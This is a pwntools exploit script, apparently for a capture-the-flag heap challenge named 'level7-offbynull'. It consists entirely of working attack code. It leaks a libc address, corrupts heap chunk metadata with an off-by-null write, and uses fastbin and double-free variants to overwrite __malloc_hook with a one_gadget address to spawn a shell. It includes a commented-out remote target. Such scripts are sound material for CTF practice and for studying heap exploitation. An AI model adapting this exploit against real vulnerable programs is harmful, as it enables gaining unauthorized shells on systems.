from pwn import *
context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']


r = process("./level7-offbynull")
#r = remote("pwn.sixstars.team", 22507)
elf = ELF("./level7-offbynull")
libc = ELF("./libc.so.6")

#print r.pid
#pause()

def add(size):
    r.sendlineafter(">> ", "1")
    r.sendlineafter("Size:", str(size))

def show(index):
    r.sendlineafter(">> ", "2")
    r.sendlineafter("id:", str(index))

def edit_line(index, data):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("id:", str(index))
    r.sendlineafter("Content:", data)

def edit(index, data):
    r.sendlineafter(">> ", "3")
    r.sendlineafter("id:", str(index))
    r.sendafter("Content:", data)

def dele(index):
    r.sendlineafter(">> ", "4")
    r.sendlineafter("id:", str(index))

# leak libc address
add(0x200)
add(0x200)
dele(0)
add(0x100)
show(0)

a = u64(r.recv(6)+'\x00\x00') - 0x3c4d78
print hex(a)
libc.address = a

dele(0)
dele(1)

# change __malloc_hook
add(0x108)      # 0
add(0x68)       # 1 (double-free heap)
add(0xf8)       # 2 (changed victim)
add(0x68)       # 3 (Prevent heap joint)
dele(0)
edit(1, 'a'*0x60+p64(0x180))
dele(2)

add(0x108)      # 0
add(0x68)       # 1 = 2

# fastbin attack version
dele(1)
edit_line(2, p64(libc.sym['__malloc_hook'] - 0x13))
add(0x68)
add(0x68)
edit_line(4, 'a'*3+p64(a+0xf02a4))

dele(1)
dele(2)
r.interactive()



# double free version --> 1 -> 3 -> 2(1)
dele(1)
dele(3)
dele(2)

add(0x68)       # 1
edit_line(1, p64(libc.sym['__malloc_hook']-0x13))

add(0x68)       # 2
add(0x68)       # 3 = 1

add(0x68)       # 4
edit_line(4, 'a'*3+p64(a+0xf02a4))      # one_gadget

# get shell
dele(1)
dele(3)

r.interactive()

